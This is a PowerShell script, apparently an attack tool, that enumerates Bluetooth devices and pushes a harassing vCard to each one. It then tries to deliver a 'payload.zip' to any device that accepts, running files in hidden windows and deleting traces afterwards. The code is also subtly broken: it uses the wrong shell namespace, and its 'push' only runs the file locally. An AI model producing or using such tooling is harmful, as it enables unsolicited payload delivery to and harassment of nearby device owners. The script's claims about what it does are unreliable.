
# GhostBLEConnect.ps1 (v2)
# Active Bluetooth scanner + benign vCard file sender
# Escalates to full payload delivery if device responds silently

$vcfFile = "$env:TEMP\RAVEN.vcf"
$payloadFile = "$PSScriptRoot\payload.zip"
$ghostTag = "GX" + (Get-Random -Minimum 1000 -Maximum 9999)
$logPath = "$env:TEMP\bt_push_log_$ghostTag.txt"

function Write-vCard {
    $vcf = @"
BEGIN:VCARD
VERSION:3.0
FN:Jesus Saves
ORG:Whisper Division
TITLE:Stealth Recon Agent
TEL;TYPE=CELL:555-0199
EMAIL:ghost@$ghostTag.local
NOTE:Come over here so I can whisper in your ear, girl.
END:VCARD
"@
    Set-Content -Path $vcfFile -Value $vcf -Encoding ASCII
}

function Log ($msg) {
    Add-Content -Path $logPath -Value ("[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $msg)
}

function Push-File {
    param([string]$targetName, [string]$file)
    try {
        $shellApp = New-Object -ComObject Shell.Application
        $btFolder = $shellApp.Namespace(26)
        $device = $btFolder.Items() | Where-Object { $_.Name -like "*$targetName*" } | Select-Object -First 1
        if ($device) {
            Log "Pushing $file to $($device.Name)..."
            Start-Process -FilePath $file -WindowStyle Hidden
            Start-Sleep -Seconds 2
            return $true
        }
    } catch {
        Log "Failed push to $targetName"
    }
    return $false
}

function Discover-BluetoothDevices {
    $bt = Get-PnpDevice -Class Bluetooth -Status OK -ErrorAction SilentlyContinue |
        Where-Object { $_.FriendlyName -and $_.Status -eq "OK" } |
        Select-Object -ExpandProperty FriendlyName -Unique
    return $bt
}

Write-vCard
$devices = Discover-BluetoothDevices

foreach ($dev in $devices) {
    Log "Discovered: $dev"
    $sent = Push-File -targetName $dev -file $vcfFile
    if ($sent) {
        Start-Sleep -Seconds 3
        Log "Trying payload delivery to $dev..."
        Push-File -targetName $dev -file $payloadFile | Out-Null
    }
}

Remove-Item $vcfFile -Force -ErrorAction SilentlyContinue
Log "Completed run. Log stored at $logPath"
